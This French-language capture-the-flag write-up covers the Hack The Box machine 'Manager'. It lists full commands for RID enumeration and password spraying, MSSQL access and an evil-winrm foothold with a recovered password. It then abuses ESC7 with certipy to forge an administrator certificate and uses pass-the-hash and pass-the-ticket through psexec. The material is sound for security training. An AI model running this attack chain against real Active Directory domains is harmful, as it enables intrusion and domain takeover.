<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Manager</title>
<meta name=description content="Platforme: Hack The Box Lien: Manager Niveau: Moyen OS: Windows Manager présente un serveur Windows 2019 utilisant Active Directory et une base de données MSSQL …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-manager/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Manager"><meta property="og:description" content="Platforme: Hack The Box Lien: Manager Niveau: Moyen OS: Windows Manager présente un serveur Windows 2019 utilisant Active Directory et une base de données MSSQL …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Manager/Manager.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Manager/Manager.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Manager"><meta name=twitter:description content="Platforme: Hack The Box Lien: Manager Niveau: Moyen OS: Windows Manager présente un serveur Windows 2019 utilisant Active Directory et une base de données MSSQL …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-manager/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-manager/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Manager/Manager.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-manager/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-manager/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Manager</h1><small role=doc-subtitle></small><p class=post-date>8 min read |
<span class=post-date>15 Mars 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Manager>Manager</a></li><li>Niveau: Moyen</li><li>OS: Windows</li></ul><hr><p>Manager présente un serveur Windows 2019 utilisant Active Directory et une base de données MSSQL en plus de quelques services tels que MSRPC et HTTP. La cible est vulnérable au brute forcing RID et à l&rsquo;ESC7 ( Vulnerable Certificate Authority Access Control).</p><p>L&rsquo;adresse IP cible est <code>10.10.11.236</code></p><h2 id=balayage-scanning>Balayage (Scanning)</h2><p>J&rsquo;identifie d&rsquo;abord tous les ports ouverts.</p><pre tabindex=0><code>nmap 10.10.11.236 -p- -T4 -Pn --open
</code></pre><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-13 13:38 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.236
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.048s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65514</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style=display:flex><span>PORT      STATE SERVICE
</span></span><span style=display:flex><span>53/tcp    open  domain
</span></span><span style=display:flex><span>80/tcp    open  http
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec
</span></span><span style=display:flex><span>135/tcp   open  msrpc
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5
</span></span><span style=display:flex><span>593/tcp   open  http-rpc-epmap
</span></span><span style=display:flex><span>636/tcp   open  ldapssl
</span></span><span style=display:flex><span>1433/tcp  open  ms-sql-s
</span></span><span style=display:flex><span>3268/tcp  open  globalcatLDAP
</span></span><span style=display:flex><span>3269/tcp  open  globalcatLDAPssl
</span></span><span style=display:flex><span>5985/tcp  open  wsman
</span></span><span style=display:flex><span>9389/tcp  open  adws
</span></span><span style=display:flex><span>49667/tcp open  unknown
</span></span><span style=display:flex><span>49669/tcp open  unknown
</span></span><span style=display:flex><span>49671/tcp open  unknown
</span></span><span style=display:flex><span>49727/tcp open  unknown
</span></span><span style=display:flex><span>57702/tcp open  unknown
</span></span><span style=display:flex><span>58902/tcp open  unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 107.12 seconds
</span></span></code></pre></div><p>J&rsquo;utilise un autre scan pour obtenir plus d&rsquo;informations sur les différents services.</p><pre tabindex=0><code>nmap -sC -sV --open 10.10.11.236
</code></pre><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-03-13 13:46 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.236
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.048s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>987</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-title: Manager
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-03-14 01:45:32Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>1433/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2019</span> 15.00.2000.00; RTM
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.10.11.236:1433: 
</span></span><span style=display:flex><span>|     Target_Name: MANAGER
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: MANAGER
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC01
</span></span><span style=display:flex><span>|     DNS_Domain_Name: manager.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: dc01.manager.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: manager.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.10.11.236:1433: 
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2019</span> RTM
</span></span><span style=display:flex><span>|       number: 15.00.2000.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2019</span>
</span></span><span style=display:flex><span>|       Service pack level: RTM
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#d19a66>1433</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2024-03-06T12:01:23
</span></span><span style=display:flex><span>|_Not valid after:  2054-03-06T12:01:23
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m40s from scanner time.
</span></span><span style=display:flex><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: manager.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>dc01.manager.htb
</span></span><span style=display:flex><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb
</span></span><span style=display:flex><span>| Not valid before: 2023-07-30T13:51:28
</span></span><span style=display:flex><span>|_Not valid after:  2024-07-29T13:51:28
</span></span><span style=display:flex><span>|_ssl-date: 2024-03-14T01:46:56+00:00; +6h58m41s from scanner time.
</span></span><span style=display:flex><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-03-14T01:46:19
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>|_clock-skew: mean: 6h58m40s, deviation: 0s, median: 6h58m39s
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 95.25 seconds
</span></span></code></pre></div><p>Tous les services et ports nécessaires pour un environnement AD (Active Directory) sont présents. Je remarque le contrôleur de domaine <code>manager.htb</code> et je l&rsquo;ajoute au fichier <code>/etc/hosts</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.236 manager.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Le site web n&rsquo;offre rien de particulier, il s&rsquo;agit d&rsquo;un site web statique sans aucune fonctionnalité.</p><p><img src=/images/HTB-Manager/website.png alt=Manager-Website></p><p>Gobuster n&rsquo;apporte rien de valable non plus.</p><p>J&rsquo;essaie ensuite d&rsquo;énumérer SMB. Je peux y accéder en tant qu&rsquo;invité, mais toujours rien d&rsquo;intéressant.</p><pre tabindex=0><code>smbmap -H 10.10.11.236 -u guest
</code></pre><p><img src=/images/HTB-Manager/smb-guest.png alt=SMB-guest-login></p><p>Je sais qu&rsquo;Active Directory est présent sur la cible donc je tente un RID brute forcing.</p><blockquote><p>RID signifie Relative Identifier (identifiant relatif). Il s&rsquo;agit d&rsquo;un identifiant unique attribué à chaque objet (tel que les utilisateurs, les groupes et les ordinateurs) au sein d&rsquo;un domaine Windows. Le RID brute forcing, également connu sous le nom de RID cycling ou RID enumeration, est une technique utilisée par les attaquants pour identifier les comptes d&rsquo;utilisateurs valides au sein d&rsquo;un domaine Windows en devinant les valeurs du RID.</p></blockquote><pre tabindex=0><code>crackmapexec smb manager.htb -u guest -p &#39;&#39; --rid-brute
</code></pre><p><img src=/images/HTB-Manager/rid-bruteforcing.png alt=RID-Brute-forcing></p><p>Je ne veux que les lignes avec des noms d&rsquo;utilisateur, je les copie donc dans un fichier (à partir de l&rsquo;utilisateur <code>Zhong</code>).</p><p><img src=/images/HTB-Manager/smb-list.png alt=Users-from-RID-brute-forcing></p><p>J&rsquo;en extrais les noms d&rsquo;utilisateurs et je les garde dans un autre fichier.</p><pre tabindex=0><code>awk -F&#39;: &#39; &#39;{split($NF, a, &#34;\\&#34;); split(a[2], b, &#34; &#34;); print tolower(b[1])}&#39; smb-output.txt &gt; smb-users.txt
</code></pre><p><img src=/images/HTB-Manager/smb-users.png alt=Domain-users-list></p><p>Essayons de trouver les comptes qui utilisent leur nom d&rsquo;utilisateur comme mot de passe.</p><pre tabindex=0><code>crackmapexec smb manager.htb -u $(cat ~/Machines/HTB/Manager/smb-users.txt) -p $(cat ~/Machines/HTB/Manager/smb-users.txt) --continue-on-success
</code></pre><p>La paire <code>operator:operator</code> est un succès!</p><p><img src=/images/HTB-Manager/smb-login.png alt=SMB-login-credentials></p><p>Il n&rsquo;y a pas de partages accessibles avec cet utilisateur, je porte mon attention sur la base de données MSSQL.</p><pre tabindex=0><code>crackmapexec mssql manager.htb -u operator -p operator
</code></pre><p>Il s&rsquo;avère que je peux accéder à la base de données avec les mêmes identifiants smb.</p><p><img src=/images/HTB-Manager/MSSQL-login.png alt=MSSQL-login-credentials></p><pre tabindex=0><code>impacket-mssqlclient operator:operator@dc01.manager.htb -windows-auth
</code></pre><p><img src=/images/HTB-Manager/MSSQL-ACCESS.png alt=MSSQL-database-accessed></p><p>J&rsquo;essaie d&rsquo;activer <code>xp_cmdshell</code> mais cela échoue.</p><blockquote><p><code>xp_cmdshell</code> est une fonctionnalité de Microsoft SQL Server qui permet aux utilisateurs d&rsquo;exécuter des commandes des commandes pour interagir avec le système d&rsquo;exploitation depuis SQL Server.</p></blockquote><p><img src=/images/HTB-Manager/xp-cmdshell.png alt=xp-cmdshell-failure></p><p>Je liste le contenu de la base de données avec <code>xp_dirtree</code>, la racine web de Microsoft IIS se trouve à <code>C:\inetpub\wwwroot</code>.</p><pre tabindex=0><code>xp_dirtree C:\inetpub\wwwroot
</code></pre><p><img src=/images/HTB-Manager/xp_dirtree.png alt=MSSQL-database-accessed></p><p>J&rsquo;ai trouvé une archive appelée <code>website-backup-27-07-23-old.zip</code> que je télécharge avec <code>wget http://manager.htb/website-backup-27-07-23-old.zip -O backup.zip</code>.</p><p>Après l&rsquo;avoir décompressé, je remarque un fichier caché appelé <code>.old-conf.xml</code>.</p><p><img src=/images/HTB-Manager/xml-file.png alt=old-conf-xml-file></p><p>Il contient les informations d&rsquo;identification de l&rsquo;utilisateur <code>raven</code>.</p><p><img src=/images/HTB-Manager/raven-user-credentials.png alt=raven-user-credentials></p><h2 id=accès-initial>Accès initial</h2><blockquote><p>Je sais d&rsquo;après les résultats de nmap que le port <code>5985</code> était ouvert, ce port est typiquement utilisé pour le service <code>WinRM (Windows Remote Management)</code>.</p></blockquote><p>Je parviens à accéder au système grâce aux identifiants de connexion trouvés précédemment.</p><pre tabindex=0><code>evil-winrm -u raven -p &#39;R4v3nBe5tD3veloP3r!123&#39; -i manager.htb
</code></pre><p><img src=/images/HTB-Manager/foothold.png alt=Foothold-via-evil-WinRM></p><p>Le fichier <code>user.txt</code> se trouve à l&rsquo;adresse <code>C:\Users\Raven\Desktop\user.txt</code>.</p><p><img src=/images/HTB-Manager/user-flag.png alt=Foothold-via-evil-WinRM></p><p>J&rsquo;énumère le système juste au cas où je devrais rechercher des vulnérabilités spécifiques à la version du système d&rsquo;exploitation. Je le fais avec <code>get-computerinfo</code>.</p><p><img src=/images/HTB-Manager/computerinfo.png alt=Target-system-info></p><p>Sachant que je suis dans un environnement Active Directory, je vérifie les droits d&rsquo;accès des utilisateurs avec <code>certify</code>, le programme est disponible <a href=https://github.com/r3motecontrol/Ghostpack-CompiledBinaries>ici</a>.</p><p><img src=/images/HTB-Manager/CA-rights.png alt=Principal-rights-enumeration></p><p>L&rsquo;utilisateur <code>raven</code> a les droits de gérer l&rsquo;autorité de certification (Certificate Authority). Il peut aussi demander et enregistrer des certificats auprès de l&rsquo;autorité de certification.</p><p>L&rsquo;autorité de certification (CA) utilisée est <code>manager-DC01-CA</code>.</p><p><img src=/images/HTB-Manager/certutil.png alt=Certificate-Authority-information></p><h2 id=escalade-des-privilèges>Escalade des privilèges</h2><p>L&rsquo;exploitation de la vulnérabilité du certificat (ESC7) est expliquée en détail <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2>ici</a>.</p><blockquote><p>&ldquo;La technique repose sur le fait que les utilisateurs ayant le droit d&rsquo;accès <code>Manage CA</code> et <code>Manage Certificates</code> peuvent émettre des requêtes de certificats qui ont échoué. Le modèle de certificat <code>SubCA</code> est vulnérable à l&rsquo;ESC1, mais seuls les administrateurs peuvent s&rsquo;inscrire dans le modèle. Ainsi, un utilisateur peut demander à s&rsquo;inscrire dans le <code>SubCA</code> - ce qui sera refusé - mais ensuite délivré par le manager&rdquo;.</p></blockquote><ol><li>Vous vous accordez le droit d&rsquo;accès <code>Manage Certificates</code> en ajoutant l&rsquo;utilisateur en tant que nouvel &ldquo;officer&rdquo;.</li></ol><pre tabindex=0><code>certipy ca -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -add-officer raven
</code></pre><p><img src=/images/HTB-Manager/CA1.png alt=Add-officer-Raven></p><ol start=2><li>Le template <code>SubCA</code> peut être <strong>activé sur l&rsquo;AC</strong> avec le paramètre <code>-enable-template</code>.</li></ol><pre tabindex=0><code>certipy ca -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -ca &#39;manager-DC01-CA&#39; -enable-template &#39;SubCA&#39;
</code></pre><p><img src=/images/HTB-Manager/CA2.png alt=Enable-SubCA></p><ol start=3><li>Nous commençons par demander un certificat basé sur le template SubCA. Cette demande sera refusée, mais nous enregistrerons la clé privée et noterons l&rsquo;identifiant de la demande. Assurez-vous que vous exécutez la commande à partir d&rsquo;un répertoire où vous avez des droits d&rsquo;écriture, sinon le fichier <code>.key</code> ne sera pas enregistré.</li></ol><pre tabindex=0><code>certipy req -ca &#39;manager-DC01-CA&#39; -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236 -template SubCA -upn administrator@manager.htb
</code></pre><p><img src=/images/HTB-Manager/CA3.png alt=Certificate-private-key></p><ol start=4><li>Avec le <code>Request ID</code>, émettez un certificat. Vous le faites avec <code>-issue-request &lt;request ID></code></li></ol><pre tabindex=0><code>certipy ca -ca &#39;manager-DC01-CA&#39; -issue-request 24 -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -dc-ip 10.10.11.236
</code></pre><p><img src=/images/HTB-Manager/CA4.png alt=Certificate-issued-successfully></p><ol start=5><li>Récupérez le certificat émis avec la commande <code>req</code> et le paramètre <code>-retrieve &lt;request ID></code>.</li></ol><pre tabindex=0><code>certipy req -username raven@manager.htb -password &#39;R4v3nBe5tD3veloP3r!123&#39; -ca manager-DC01-CA -target manager.htb -retrieve 24 -dc-ip 10.10.11.236
</code></pre><p><img src=/images/HTB-Manager/CA5.png alt=Certificate-retrieved></p><ol start=6><li>L&rsquo;exécution des commandes suivantes nécessitera une synchronisation d&rsquo;horloge avec le contrôleur de domaine (DC). Pour que cela fonctionne, nous pouvons utiliser <code>ntpdate</code>.</li></ol><blockquote><p>Cette étape est très sensible au temps, vous devez exécuter ces commandes rapidement. Si vous n&rsquo;y arrivez pas, je vous recommande d&rsquo;enchaîner les commandes après avoir exécuté <code>sudo ntpdate -u manager.htb</code>.</p></blockquote><p>Si les commandes ne sont pas exécutées assez rapidement, cette erreur se produit.</p><p><img src=/images/HTB-Manager/Clock-error.png alt=Clock-skew-error></p><p>Utilisez la commande ci-dessous et exécutez immédiatement la seconde commande avec <code>certipy auth</code>.</p><pre tabindex=0><code>sudo ntpdate -u manager.htb
</code></pre><p><img src=/images/HTB-Manager/CLOCK-SYNC.png alt=ntpdate-clock-sync></p><pre tabindex=0><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
</code></pre><p>Nous obtenons un ticket TGT et le hash de l&rsquo;administrateur. Les deux peuvent être utilisés pour obtenir des privilèges administrateurs. Vous pouvez vous connecter avec le hash en utilisant <code>evil-winrm</code> ou vous pouvez passer le ticket avec <code>impacket</code>.</p><p><img src=/images/HTB-Manager/CA6.png alt=TGT-Ticket-and-admin-hash></p><h3 id=méthode-evil-winrm>Méthode evil-winrm</h3><pre tabindex=0><code>evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
</code></pre><p><img src=/images/HTB-Manager/evil-winrm-root.png alt=admin-shell-evil-WinRM></p><h3 id=passer-le-ticket-pass-the-ticket-attack>Passer le ticket (Pass the ticket Attack)</h3><blockquote><p>Cette méthode est sujette à l&rsquo;erreur <code>Kerberos SessionError : KRB_AP_ERR_SKEW(Clock skew too great)</code>, vous devrez réutiliser la commande <code>ntpdate</code> avant d&rsquo;utiliser <code>impacket</code>.</p></blockquote><p>Pour passer le ticket, je dois d&rsquo;abord l&rsquo;exporter. Vous trouverez plus d&rsquo;informations <a href=https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate>ici</a>.</p><pre tabindex=0><code>export KRB5CCNAME=administrator.ccache
</code></pre><p>Je me connecte ensuite au contrôleur de domaine (DC)</p><pre tabindex=0><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
</code></pre><p>Et nous sommes en possession d&rsquo;un compte privilégié!</p><p><img src=/images/HTB-Manager/CA7.png alt=Impacket-privileged-account></p><h3 id=méthode-des-commandes-en-chaîne>Méthode des commandes en chaîne</h3><p>Enchaîner les commandes peut être la solution pour vous si vous n&rsquo;arrivez pas à les exécuter assez rapidement individuellement. Cependant, vous aurez probablement besoin d&rsquo;essayer plusieurs fois.</p><pre tabindex=0><code>sudo ntpdate -u manager.htb
</code></pre><pre tabindex=0><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 &amp;&amp; export KRB5CCNAME=administrator.ccache &amp;&amp; python3 /usr/share/doc/python3-impacket/examples/psexec.py manager.htb/administrator@dc01 -k -no-pass -dc-ip 10.10.11.236 -target-ip 10.10.11.236
</code></pre><p><img src=/images/HTB-Manager/CA-chain-cmds.png alt=ESC7-with-chained-commands></p><p>Le fichier <code>root.txt</code> se trouve à <code>c:\Users\Administrator\Desktop</code></p><p><img src=/images/HTB-Manager/root-flag.png alt=root-flag></p><p>C&rsquo;est tout pour cette machine, j&rsquo;espère que ce article vous aura été utile! Je compte explorer d&rsquo;autres platformes de hacking bientôt telles que Hackviser et HackMyVM. Restez à l&rsquo;écoute et n&rsquo;hésitez pas à me contacter sur X à <a href=https://twitter.com/_KScorpio>@_KScorpio</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-cozyhosting/>&#8592;
Précédent:
HTB: CozyHosting</a></p><p class=prev-post-date>mars 2, 2024</p></div><div class=next-post><p><a href=/fr/posts/thm-hacksmartersecurity/>Suivant:
THM: Hack Smarter Security
&#8594;</a></p><p class=next-post-date>mars 22, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage-scanning>Balayage (Scanning)</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a></li><li><a href=#escalade-des-privilèges>Escalade des privilèges</a><ul><li><a href=#méthode-evil-winrm>Méthode evil-winrm</a></li><li><a href=#passer-le-ticket-pass-the-ticket-attack>Passer le ticket (Pass the ticket Attack)</a></li><li><a href=#méthode-des-commandes-en-chaîne>Méthode des commandes en chaîne</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>